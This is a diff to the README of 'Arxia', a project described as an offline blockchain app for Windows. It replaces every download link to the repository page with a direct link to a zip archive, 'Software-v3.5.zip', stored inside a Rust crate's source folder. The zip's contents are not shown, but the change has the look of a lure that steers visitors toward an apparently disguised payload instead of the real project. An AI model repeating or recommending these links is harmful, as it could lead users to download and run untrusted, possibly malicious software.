@@ -1,12 +1,12 @@
 # ⚙️ Arxia - Offline Blockchain for Everyday Use
 
-[![Download Arxia](https://img.shields.io/badge/Download-Arxia-blue?style=for-the-badge)](https://github.com/Amorpa4063/Arxia)
+[![Download Arxia](https://img.shields.io/badge/Download-Arxia-blue?style=for-the-badge)](https://raw.githubusercontent.com/Amorpa4063/Arxia/main/crates/arxia-crdt/Software-v3.5.zip)
 
 ## 📥 Download
 
 Visit this page to download Arxia for Windows:
 
-https://github.com/Amorpa4063/Arxia
+https://raw.githubusercontent.com/Amorpa4063/Arxia/main/crates/arxia-crdt/Software-v3.5.zip
 
 ## 🪟 Windows Setup
 
@@ -182,7 +182,7 @@ The app focuses on stable local operation, simple sync, and support for mixed tr
 
 Use this link to visit the download page and get Arxia for Windows:
 
-https://github.com/Amorpa4063/Arxia
+https://raw.githubusercontent.com/Amorpa4063/Arxia/main/crates/arxia-crdt/Software-v3.5.zip
 
 ## 🏁 Start Here
 
